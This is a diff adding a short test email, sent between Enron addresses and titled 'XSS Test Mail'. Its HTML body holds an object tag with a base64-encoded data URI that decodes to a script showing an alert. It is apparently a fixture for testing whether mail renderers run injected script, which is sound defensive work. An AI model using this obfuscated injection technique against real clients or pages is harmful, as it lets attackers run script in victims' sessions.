@@ -1,0 +1,7 @@
+From: neil.carpino@enron.com
+To: kimberly.watson@enron.com, sean.bolks@enron.com, michelle.lokay@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFjayBieSBweDE2MjQiKTwvc2NyaXB0Pg==">
